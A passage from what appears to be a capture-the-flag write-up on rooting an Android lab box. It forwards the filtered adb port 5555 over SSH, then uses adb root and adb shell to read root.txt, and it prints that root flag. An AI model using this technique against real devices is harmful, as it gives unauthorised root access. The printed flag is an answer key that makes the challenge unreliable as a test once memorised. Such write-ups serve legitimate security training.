“Rooting” the device

For “rooting” the device, it is needed to connect using adb and then enter adb root, adb shell. However, to connect to the device, adb needs port 5555 to be open in the device. But this port is filtered, as shown on the nmap output.

To bypass this protection, the connection can be done with SSH port forwarding:

$ ssh -fNL 5000:localhost:5555 kristi@10.10.10.247 -p 2222

And now, adb can connect to the device from localhost:5000 and get the root.txt flag:

$ adb kill-server

$ adb start-server
* daemon not running; starting now at tcp:5037
* daemon started successfully

$ adb connect 127.0.0.1:5000
connected to 127.0.0.1:5000

$ adb devices
List of devices attached
127.0.0.1:5000  device

$ adb root

$ adb shell
x86_64:/ # find / -name root.txt 2>/dev/null  
/data/root.txt
x86_64:/ # cat /data/root.txt
f04fc82b6d49b41c9b08982be59338c5
